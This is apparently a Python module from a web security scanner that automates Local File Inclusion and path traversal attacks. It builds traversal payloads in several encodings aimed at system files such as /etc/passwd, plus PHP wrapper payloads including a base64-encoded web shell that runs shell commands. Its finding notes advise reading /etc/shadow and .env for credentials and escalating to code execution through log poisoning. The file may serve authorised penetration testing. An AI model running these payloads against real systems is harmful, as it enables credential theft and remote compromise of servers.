"""
modules/lfi/lfi_tester.py
==========================
Local File Inclusion (LFI) and Path Traversal detection engine.

Why this file exists:
    LFI is one of the most impactful vulnerabilities in web applications.
    A single vulnerable file parameter can expose /etc/passwd, application
    source code, SSH keys, database credentials, and environment variables.

    Manual LFI hunting is tedious: you have to test every file/path
    parameter with dozens of traversal variants. This module automates
    the pattern while staying precise — it only fires at parameters that
    look like they handle file paths, avoiding blind spraying.

Detection strategy:
    For each candidate parameter (ones whose name/value suggests file paths):
        1. Build traversal payloads at depths 1–8 (../../etc/passwd)
        2. Test both Linux and Windows target files
        3. Check response body for file content signatures
           (e.g. "root:x:0:0" for /etc/passwd)
        4. Test PHP wrappers if enabled (php://filter/convert.base64-encode)

What makes a parameter a candidate:
    Name hints: file, path, page, template, view, include, load, dir, folder
    Value hints: contains '/', '.php', '.html', '../', 'file://'

Traversal depth:
    We test from depth 1 (../) up to CONFIG.lfi.max_traversal_depth (default 8).
    Most vulnerable apps are within depth 3-5 from the web root.
    We stop per-file as soon as a hit is confirmed.

PHP wrapper testing:
    php://filter/convert.base64-encode/resource=/etc/passwd
    If the response contains a base64-looking string, we have LFI.
    This bypasses some include() filters that check file content.
"""

import time
import base64
import re
from dataclasses import dataclass, field
from typing import List, Optional, Dict
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from core.recon.url_handler import URLTarget
from core.extractor.param_extractor import Parameter, ParamType
from core.utils.http_client import safe_get, safe_post
from config.settings import CONFIG
from core.utils.logger import get_logger

log = get_logger(__name__)


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclass
class LFIFinding:
    """
    Evidence record for a confirmed LFI/path traversal vulnerability.

    Attributes:
        url:            Probe URL that triggered the LFI.
        parameter:      Vulnerable parameter name.
        payload:        The traversal payload that succeeded.
        target_file:    The file that was successfully read.
        evidence:       Snippet of file content found in response.
        technique:      Description (standard traversal / PHP wrapper).
        response_code:  HTTP status code.
        severity:       HIGH — LFI is critical severity.
        notes:          Next steps and chaining opportunities.
    """

    url: str
    parameter: str
    payload: str
    target_file: str
    evidence: str
    technique: str
    response_code: int = 200
    severity: str = "HIGH"
    notes: List[str] = field(default_factory=list)

    def __repr__(self) -> str:
        return (
            f"LFIFinding([{self.severity}] param={self.parameter!r} "
            f"file={self.target_file!r})"
        )


# ---------------------------------------------------------------------------
# Parameter candidate detection
# ---------------------------------------------------------------------------

# Parameter names that commonly handle file paths
FILE_PARAM_NAMES = {
    "file", "path", "page", "template", "view", "include", "load",
    "dir", "folder", "document", "doc", "name", "module", "action",
    "pg", "content", "show", "display", "read", "resource", "src",
    "filename", "filepath", "lang", "language", "locale",
}

# Value patterns that suggest a file path
FILE_VALUE_PATTERNS = [
    re.compile(r'\.(php|html|htm|txt|xml|cfg|conf|ini|log)$', re.I),
    re.compile(r'^[./\\]'),       # starts with / . or \
    re.compile(r'\.\./'),         # already has traversal
    re.compile(r'file://'),       # file:// URI
]


def _is_file_param(param: Parameter) -> bool:
    """Return True if this parameter looks like a file/path handler."""
    name_lower = param.name.lower()

    if name_lower in FILE_PARAM_NAMES:
        return True

    # Partial name match
    for hint in ["file", "path", "page", "template", "include", "load", "dir"]:
        if hint in name_lower:
            return True

    # Value pattern match
    for pattern in FILE_VALUE_PATTERNS:
        if pattern.search(param.value):
            return True

    return False


# ---------------------------------------------------------------------------
# Payload builders
# ---------------------------------------------------------------------------

def _build_traversal_payloads(target_file: str, max_depth: int) -> List[tuple]:
    """
    Build a list of (payload, technique) tuples for a target file.

    We generate traversal sequences at each depth for both Unix and
    Windows path separators, plus null-byte termination bypass.

    Args:
        target_file: The file to attempt reading (e.g. /etc/passwd).
        max_depth:   Maximum traversal depth (../../../ etc.).

    Returns:
        List of (payload_string, technique_description) tuples.
    """
    payloads = []

    for depth in range(1, max_depth + 1):
        # Unix style
        traversal = "../" * depth
        payloads.append((
            f"{traversal}{target_file.lstrip('/')}",
            f"Unix traversal depth={depth}",
        ))

        # Encoded traversal
        traversal_enc = "%2e%2e%2f" * depth
        payloads.append((
            f"{traversal_enc}{target_file.lstrip('/')}",
            f"URL-encoded traversal depth={depth}",
        ))

        # Double-encoded
        traversal_dbl = "%252e%252e%252f" * depth
        payloads.append((
            f"{traversal_dbl}{target_file.lstrip('/')}",
            f"Double URL-encoded traversal depth={depth}",
        ))

        # Windows style
        win_traversal = "..\\" * depth
        win_file = target_file.replace("/", "\\").lstrip("\\")
        payloads.append((
            f"{win_traversal}{win_file}",
            f"Windows traversal depth={depth}",
        ))

        # Null byte termination (PHP < 5.3.4)
        payloads.append((
            f"{traversal}{target_file.lstrip('/')}%00",
            f"Null-byte terminated depth={depth}",
        ))

    # Absolute path injection (no traversal)
    payloads.insert(0, (target_file, "Absolute path injection"))

    return payloads


def _build_php_wrapper_payloads(target_file: str) -> List[tuple]:
    """
    Build PHP stream wrapper payloads for LFI confirmation.

    PHP wrappers allow reading files as base64, which bypasses
    content-based filters and works even when output is not directly
    echoed to the page.

    Args:
        target_file: File to read via wrapper.

    Returns:
        List of (payload_string, technique_description) tuples.
    """
    return [
        (
            f"php://filter/convert.base64-encode/resource={target_file}",
            "PHP filter base64 wrapper",
        ),
        (
            f"php://filter/read=string.rot13/resource={target_file}",
            "PHP filter ROT13 wrapper",
        ),
        (
            f"php://filter/convert.base64-encode/convert.base64-encode/resource={target_file}",
            "PHP double base64 wrapper",
        ),
        (
            f"data://text/plain;base64,{base64.b64encode(b'<?php system($_GET[cmd]); ?>').decode()}",
            "PHP data:// wrapper code injection",
        ),
    ]


# ---------------------------------------------------------------------------
# Signature detection
# ---------------------------------------------------------------------------

def _detect_file_content(response_text: str, target_file: str) -> Optional[str]:
    """
    Check if the response contains signatures of the target file's content.

    Args:
        response_text: HTTP response body.
        target_file:   The file we attempted to read.

    Returns:
        Evidence snippet string if content found, None otherwise.
    """
    cfg = CONFIG.lfi

    # Linux file signatures
    for sig in cfg.linux_signatures:
        if sig in response_text:
            idx = response_text.find(sig)
            start = max(0, idx - 20)
            end = min(len(response_text), idx + len(sig) + 80)
            return response_text[start:end].replace("\n", "↵")

    # Windows file signatures
    for sig in cfg.windows_signatures:
        if sig.lower() in response_text.lower():
            idx = response_text.lower().find(sig.lower())
            start = max(0, idx - 20)
            end = min(len(response_text), idx + len(sig) + 80)
            return response_text[start:end].replace("\n", "↵")

    # PHP wrapper: large base64 block is a strong indicator
    b64_pattern = re.compile(r'[A-Za-z0-9+/]{100,}={0,2}')
    if "php://filter" in target_file or "base64" in target_file:
        match = b64_pattern.search(response_text)
        if match:
            return f"[BASE64 CONTENT DETECTED] {match.group(0)[:80]}..."

    return None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def run_lfi_tests(target: URLTarget) -> List[LFIFinding]:
    """
    Run LFI/path traversal tests on all file-like parameters.

    Args:
        target: URLTarget with .parameters populated by Phase 1.

    Returns:
        List of LFIFinding objects for confirmed file reads.
    """
    cfg = CONFIG.lfi
    parameters: List[Parameter] = getattr(target, "parameters", [])

    if not parameters:
        log.info("No parameters — skipping LFI tests for %s", target.normalized)
        return []

    candidates = [p for p in parameters if _is_file_param(p)]

    if not candidates:
        log.info("No file-like parameters on %s — skipping LFI tests", target.normalized)
        return []

    log.info(
        "Starting LFI tests on %s — %d candidate(s): %s",
        target.normalized, len(candidates), [p.name for p in candidates],
    )

    all_findings: List[LFIFinding] = []

    for param in candidates:
        log.info("  Testing LFI: param=%r", param.name)
        found_on_param = False

        for target_file in cfg.target_files:

            if found_on_param:
                break

            # Standard traversal payloads
            traversal_payloads = _build_traversal_payloads(
                target_file, cfg.max_traversal_depth
            )

            # PHP wrapper payloads (optional)
            php_payloads = []
            if cfg.test_php_wrappers:
                php_payloads = _build_php_wrapper_payloads(target_file)

            all_payloads = traversal_payloads + php_payloads

            for payload_str, technique in all_payloads:
                if found_on_param:
                    break

                # Build request
                if param.param_type == ParamType.GET:
                    parsed = urlparse(target.normalized)
                    qp = parse_qs(parsed.query, keep_blank_values=True)
                    qp[param.name] = [payload_str]
                    probe_url = urlunparse(
                        parsed._replace(query=urlencode({k: v[0] for k, v in qp.items()}))
                    )
                    response = safe_get(probe_url)
                else:
                    post_url = param.form_action or target.base_url()
                    form_data = {param.name: payload_str}
                    response = safe_post(post_url, data=form_data)
                    probe_url = post_url

                time.sleep(0.15)

                if response is None:
                    continue

                evidence = _detect_file_content(response.text, payload_str)

                if evidence:
                    finding = LFIFinding(
                        url=probe_url,
                        parameter=param.name,
                        payload=payload_str,
                        target_file=target_file,
                        evidence=evidence,
                        technique=technique,
                        response_code=response.status_code,
                        severity="HIGH",
                    )
                    finding.notes.append(
                        "Attempt to read /etc/shadow, .env, config.php for credentials"
                    )
                    finding.notes.append(
                        "Try /proc/self/environ to dump environment variables"
                    )
                    finding.notes.append(
                        "LFI to RCE: test log poisoning via /var/log/apache2/access.log"
                    )
                    all_findings.append(finding)
                    found_on_param = True

                    log.info(
                        "  [LFI CONFIRMED] param=%r file=%r technique=%r",
                        param.name, target_file, technique,
                    )

    log.info(
        "LFI testing complete for %s: %d finding(s)",
        target.normalized, len(all_findings),
    )

    setattr(target, "lfi_findings", all_findings)
    return all_findings
